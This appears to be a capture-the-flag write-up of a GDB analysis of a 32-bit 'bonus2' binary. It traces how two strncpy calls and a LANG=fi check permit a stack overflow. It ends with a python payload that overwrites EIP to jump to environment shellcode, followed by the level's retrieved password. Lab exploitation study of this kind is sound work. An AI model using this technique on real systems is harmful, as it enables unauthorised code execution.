GDB ANALYSIS - BONUS2

1. Program start and stack setup

* push %ebp
* mov %esp,%ebp
* push %edi, %esi, %ebx
* and $0xfffffff0,%esp
* sub $0xa0,%esp

The program sets up a stack frame and allocates 160 bytes of local stack space.

2. Argument check

* cmpl $0x3,0x8(%ebp)
* je main+31
* else return 1

The program expects exactly 2 arguments (argc == 3). If not, it exits.

3. Buffer initialization

* lea 0x50(%esp),%ebx
* memset(buffer, 0, 0x13 * 4)

A buffer starting at esp+0x50 is cleared (size ≈ 76 bytes).

4. First strncpy

* source: argv[1]
* destination: buffer
* size: 0x28 (40 bytes)

Copies first argument into buffer (max 40 bytes).

5. Second strncpy

* source: argv[2]
* destination: buffer + 0x28
* size: 0x20 (32 bytes)

Copies second argument right after the first one in the same buffer.

Important:
Total possible write = 40 + 32 = 72 bytes into a ~76-byte buffer → tight but dangerous.

6. Environment variable check

* getenv("LANG")
* if NULL → skip

The program reads LANG environment variable.

7. memcmp checks

* compare first 2 bytes of LANG with "fi"
* if equal → set global flag

This is why:
export LANG=fi

8. Output behavior

* prints: "Hyvää päivää ..." (Finnish greeting)

Triggered only if LANG starts with "fi".

9. Crash point
   Program execution:
   Segmentation fault at 0x41366141

0x41366141 = "Aa6A" (pattern overflow)

This confirms:

* Buffer overflow occurred
* Return address overwritten by cyclic pattern

10. Exploit strategy

* First argument fills first 40 bytes
* Second argument overflows into saved EIP
* Offset found using pattern (Aa0Aa1...)

11. Payload structure
    "Aa0Aa1Aa2Aa3Aa4Aa5" + address + padding

Example:
python -c "print 'Aa0Aa1Aa2Aa3Aa4Aa5' + '\xaf\xf8\xff\xbf' + 'BBBB'"

Injected address:
0xbffff8af → likely points to shellcode in environment

12. Environment shellcode
    Using helper:
    getenv SHELLCODE

Find address of shellcode stored in env variable.

13. Final result

* Control EIP via argv[2]
* Redirect execution to shellcode in environment
* Gain access to next level password

Password retrieved:
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
